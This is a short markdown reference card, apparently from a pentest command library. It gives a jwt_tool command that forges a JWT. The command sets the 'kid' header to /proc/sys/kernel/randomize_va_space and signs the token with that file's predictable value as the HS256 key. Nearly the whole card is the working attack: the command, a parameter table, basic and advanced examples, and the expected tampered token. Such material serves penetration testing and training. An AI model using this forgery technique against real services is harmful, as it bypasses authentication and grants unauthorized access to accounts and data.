---
type: command
executor: bash
data: >-
  python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space"
  -S hs256 -p "2"
tags:
  - jwt
  - token-modification
platforms:
  - Linux
verified: true
validated: true
---

# modify-jwt-kid-to-randomize-va-space-with-jwt-tool

## Command

```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```

## Description

This command modifies a JWT's 'kid' to point to /proc/sys/kernel/randomize_va_space, using its predictable numeric content (e.g., '2') as the signing key for forgery.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| <JWT> | Base64-encoded JWT token | Yes |
| -I | Inspect and modify mode | Yes |
| -hc kid | Change header claim 'kid' | Yes |
| -hv "/proc/sys/kernel/randomize_va_space" | Set 'kid' to the predictable file path | Yes |
| -S hs256 | Set signing algorithm to HS256 | Yes |
| -p "2" | Key/password matching file content (adjust based on system) | Yes |

## Examples

### Basic Usage

```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```

### Advanced Usage

```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "1" -v
```

## Expected Output

Tampered JWT, e.g., 'JWT modified. New token: eyJ...new_sig' with 'kid': "/proc/sys/kernel/randomize_va_space".

## Related

- [[procedures/JWT-Key-ID-kid-Claim-Misuse]]
